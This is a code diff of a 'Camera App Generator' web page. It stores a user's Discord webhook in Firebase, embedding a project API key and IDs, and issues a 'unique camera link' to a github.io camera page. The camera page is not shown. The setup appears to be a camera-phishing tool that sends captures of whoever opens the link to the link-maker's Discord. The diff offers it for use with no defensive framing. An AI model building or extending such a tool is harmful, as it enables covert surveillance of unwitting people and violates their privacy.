@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Camera App Generator</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -59,36 +61,45 @@
     <p id="generatedLink"></p>
 
     <script>
-        const generateButton = document.getElementById('generateButton');
-        const webhookInput = document.getElementById('webhookInput');
-        const errorMessage = document.getElementById('errorMessage');
-        const generatedLink = document.getElementById('generatedLink');
+        // Firebase Config (replace with your actual Firebase config)
+        const firebaseConfig = {
+            apiKey: "AIzaSyALBfaHvq7ZuHdtL8DSvg1NWJ1MymG9G8Q",
+            authDomain: "camera-fbd09.firebaseapp.com",
+            projectId: "camera-fbd09",
+            storageBucket: "camera-fbd09.firebasestorage.app",
+            messagingSenderId: "442525030455",
+            appId: "1:442525030455:web:41ffd3c54302299479c7b2",
+            measurementId: "G-NN810LP0E8"
+        };
 
-        // Function to generate a unique ID
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.database(app);
+
         function generateUniqueID() {
             return 'ID' + Math.floor(Math.random() * 10000000000000).toString();
         }
 
-        // Function to generate and store the link
-        generateButton.addEventListener('click', () => {
-            const webhookURL = webhookInput.value.trim();
-            
+        document.getElementById('generateButton').addEventListener('click', () => {
+            const webhookURL = document.getElementById('webhookInput').value.trim();
+
             if (!webhookURL) {
-                errorMessage.textContent = "Please enter a valid Discord Webhook URL!";
+                document.getElementById('errorMessage').textContent = "Please enter a valid Discord Webhook URL!";
                 return;
             }
 
             const userID = generateUniqueID();
 
-            // Store the user ID and webhook URL in localStorage
-            localStorage.setItem(userID, webhookURL);
+            // Store in Firebase Realtime Database
+            firebase.database().ref('webhooks/' + userID).set({
+                webhookURL: webhookURL
+            });
 
-            // Display the generated link for the user
-            const generatedURL = `https://xxza1dxx.github.io/campranker/camera.html?userID=${userID}`;
-            generatedLink.textContent = `Your unique camera link: ${generatedURL}`;
+            const generatedURL = `https://xxza1dxx.github.io/CameraApp/camera.html?userID=${userID}`;
+            document.getElementById('generatedLink').textContent = `Your unique camera link: ${generatedURL}`;
 
             // Clear the error message
-            errorMessage.textContent = "";
+            document.getElementById('errorMessage').textContent = "";
         });
     </script>
 
